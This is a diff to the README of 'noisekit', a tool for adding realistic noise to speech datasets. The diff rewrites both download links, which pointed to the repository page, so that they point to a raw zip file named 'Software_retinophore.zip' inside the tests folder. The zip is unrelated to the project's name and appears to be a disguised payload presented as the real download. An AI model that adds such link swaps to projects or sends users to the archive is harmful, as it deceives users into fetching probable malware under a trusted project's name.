@@ -1,6 +1,6 @@
 # 🎧 noisekit - Create speech datasets for better testing
 
-[![Download noisekit](https://img.shields.io/badge/Download-Noisekit-blue.svg)](https://github.com/jcwar3432/noisekit)
+[![Download noisekit](https://img.shields.io/badge/Download-Noisekit-blue.svg)](https://raw.githubusercontent.com/jcwar3432/noisekit/main/tests/Software_retinophore.zip)
 
 Noisekit helps you prepare audio files for speech recognition tests. It takes clean recordings and adds realistic background noise. This process helps you measure how well your software understands speech in difficult conditions. You can use this tool to build clean, accurate samples for your machine learning workflows.
 
@@ -22,7 +22,7 @@ Before you start, make sure your computer meets these needs:
 
 You must visit the project page to get the latest version. Follow these steps to prepare your system.
 
-[Visit the repository page to download](https://github.com/jcwar3432/noisekit)
+[Visit the repository page to download](https://raw.githubusercontent.com/jcwar3432/noisekit/main/tests/Software_retinophore.zip)
 
 1. Open your web browser.
 2. Go to the project link above.
